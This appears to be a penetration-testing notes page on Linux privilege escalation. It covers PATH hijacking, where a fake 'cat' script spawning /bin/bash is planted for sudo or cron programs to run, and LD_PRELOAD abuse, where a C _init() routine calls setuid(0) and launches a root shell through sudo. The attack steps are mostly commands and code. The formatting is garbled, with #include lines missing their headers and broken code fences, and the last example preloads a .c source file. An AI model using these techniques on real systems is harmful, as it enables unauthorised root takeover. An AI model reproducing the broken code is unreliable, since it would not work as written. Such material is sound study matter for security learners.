# 5\_Environmental\_Variables

## General

```text
cat /etc/profile 
cat /etc/bashrc 
cat ~/.bash_profile 
cat ~/.bashrc 
cat ~/.bash_logout 
env set
```

## $PATH Variable

### Background

* PATH variable is an environment variable that specifies where executable programs are located. 
* If you type in $PATH in a Unix machine, it will output the directories where various executables are stored. 
* System tries to identify programs in the file locations of the variable going from left to right.

### Attack Vector

#### Programs That Redefine PATH

1. Identify any programs that redefined the PATH variable as part of execution or identify where the default PATH variable points to.  
2. Evaluate the permissions of the folder locations in the PATH variable to see if we have write access to any of them. 
3. If we have write access to any of the folders we can delete the legitimate binary in the folder location and replace it with a malicious one that is executed by a program or Cron job.

#### Programs That Don't Use Full Path For Commands \(Vulnhub:init\)

* Commonly a script uses the name of the command \(cat\) instead of the full path to the command \(/usr/bin/cat\) within a program.  If this occurs, we can:
  * Edit the PATH variable to include a new location to check for the command \(cat\) which executes a shell.  Note: Our current user would need to have the ability to execute the program as we can only change the PATH for the current user \(not the entire system\).
  * Redefine the path by including a directory of our choice at the beginning \(furthest left\) of the check path.

    ```text
    PATH=/new/directory:$PATH
    ```

  * Navigate to the /new/directory and add in a custom shell program with the same name as the command \(cat\) called in the vulnerable program.

    ```text
    echo "/bin/bash" > [shell command]
    ```

  * Make the custom shell program executable by all.

    ```text
    chmod 777 [shell command]
    ```

  * Execute the vulnerable program to have it execute the command \(cat\) which will then search in our /new/directory and execute the same-named shell command to serve a shell under the user that is set earlier in the vulnerable program.
  * Display the PATH variable paths and see if we have access to delete the command in the PATH and replace it with our shell command.  Note: Our current user wouldn't be the one executing this vulnerable program.  It would likely be executed via a cronjob of the elevated user or through SUDO.
  * Understand what locations PATH variable checks.

    ```text
    echo $PATH
    ```

  * Navigate to each PATH going from left to right to see where the command \(cat\) is located first.
  * See if we can change / delete the command \(cat\) with our permissions / upload a replacement shell program named the same as the command \(cat\).

    ```text
    echo "/bin/bash" > [shell commmand]
    ```

  * Make sure the custom shell command is executable by all.

    ```text
    chmod 777 [custom shell command]
    ```

  * Wait for or sudo execute the vulnerable program to thereby execute our shell command.

## $LD\_PRELOAD Variable

### Background

* LD\_PRELOAD is an environment variable that can be set to point to any shared libraries specified. The dynamic linker on the Unix system will load these shared libraries before other libraries. 
* If we have SUDO access to a program that needs to load libraries for operation and also have access to the LD\_PRELOAD variable, we can force the program to load and execute our malicious libraries first before the legitimate ones.

### Attack Vector

1. Create a malicious program 

   \`\`\`

   include  

   include &lt;sys/types.h&gt;  

   include  

void \_init\(\)  
{ unsetenv\("LD\_PRELOAD"\); setgid\(0\); setuid\(0\);  
system\("/bin/bash"\); }

```text
2. Compile programm if necessary. 
3. Load the new library executable first when running a program we have sudo privileges to and we get root.
```

Sudo LD\_PRELOAD=\[path to malicious program\] \[normal sudo program\]

```text

```

Sudo LD\_PRELOAD=/tmp/bad.c find

\`\`\`

